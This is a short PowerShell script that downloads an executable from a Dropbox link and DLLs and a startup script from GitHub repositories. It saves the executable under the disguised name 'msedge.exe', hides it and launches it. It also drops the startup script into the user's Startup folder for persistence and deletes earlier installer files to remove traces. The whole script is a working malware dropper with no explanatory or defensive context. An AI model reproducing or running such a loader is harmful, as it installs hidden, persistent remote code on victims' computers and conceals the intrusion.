cd $env:temp

mkdir sVBXKuz

cd sVBXKuz

Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/m3ub7x9td0g1a7b2jlv62/wsappa-1.9.exe?rlkey=rhyarsxdetqvyyx5gfv44uyq7&dl=0" -OutFile msedge.exe
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/main/bd/startup.cmd" -OutFile startup.cmd

$folderPath = "$env:temp\sVBXKuz"
$file = Join-Path $folderPath "msedge.exe"

$attr = [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)



Move-Item "startup.cmd" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"


Start-Process $env:temp/sVBXKuz/msedge.exe

powershell.exe /c Remove-Item $env:temp/nadmin_dinstall.ps1
powershell.exe -Command "Remove-Item '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\usbinstaller.cmd'"


exit
